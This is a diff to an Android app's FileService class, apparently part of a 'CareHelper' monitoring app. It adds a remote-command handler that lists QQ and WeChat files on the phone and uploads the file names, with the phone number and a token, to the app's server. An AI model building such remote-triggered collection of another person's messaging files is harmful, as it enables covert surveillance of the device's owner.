@@ -2,17 +2,26 @@ package org.bert.carehelper.service;
 
 import android.content.Context;
 import android.os.Environment;
+import android.util.Log;
 
 import androidx.documentfile.provider.DocumentFile;
 import androidx.fragment.app.FragmentActivity;
 
+import com.alibaba.fastjson2.JSON;
+import com.tencent.map.geolocation.TencentLocationManager;
+
+import org.bert.carehelper.common.API;
+import org.bert.carehelper.common.CareHelperContext;
 import org.bert.carehelper.common.CareHelperEnvironment;
+import org.bert.carehelper.common.CommandType;
 import org.bert.carehelper.common.FileUrlUtils;
 import org.bert.carehelper.entity.CommandResponse;
+import org.bert.carehelper.http.HTTPConnection;
 
 import java.io.FileNotFoundException;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.concurrent.ThreadPoolExecutor;
 
 
 public class FileService implements Service {
@@ -26,10 +35,15 @@ public class FileService implements Service {
 
     protected Map<String, DocumentFile> fileMap;
 
+    private CareHelperContext cContext = CareHelperContext.getInstance();
+
+    private ThreadPoolExecutor threadPool = null;
+
+
     public FileService(Context context, FragmentActivity activity) {
         this.context = context;
         this.activity = activity;
-
+        this.threadPool = cContext.getThreadPoolExecutor();
         if (!FileUrlUtils.isGrant$File(this.context)) {
             // 获取读写权限
             FileUrlUtils.startForRoot$Data(this.activity, 1);
@@ -99,8 +113,49 @@ public class FileService implements Service {
     }
 
     @Override
-    public CommandResponse doCommand(String content) {
+    public CommandResponse doCommand(String type) {
 
-        return null;
+        CommandResponse response = new CommandResponse();
+        response.setPhone(this.cContext.getPhone());
+        response.setToken(this.cContext.getEnvironment().getToken());
+        String[] strings = type.split(":");
+        if (strings.length < 2) {
+            Log.e(TAG, "commands error!");
+            return response;
+        }
+        switch (strings[1]) {
+            case CommandType.QQ:
+                Map<String, DocumentFile> qq = this.getQQRecvFiles();
+                String qqJsonStr = JSON.toJSONString(qq.keySet());
+                response.setStatus(0);
+                response.setMessage(qqJsonStr);
+                this.syncData(response);
+                break;
+            case CommandType.WE:
+                Map<String, DocumentFile> we = this.getWechatFiles();
+                String weJsonStr = JSON.toJSONString(we.keySet());
+                response.setStatus(0);
+                response.setMessage(weJsonStr);
+                this.syncData(response);
+                break;
+        }
+        return response;
+    }
+
+    private void syncData(CommandResponse response) {
+        try {
+            Log.i(TAG, "commands exec success, wait 4 sec to do upload task!");
+            Thread.sleep(4000);
+            this.threadPool.execute(()->{
+                Log.i(TAG, "doing upload task！");
+                new HTTPConnection(
+                        API.API_COMMAND + "/receive",
+                        response,
+                        "POST"
+                ).run();
+            });
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
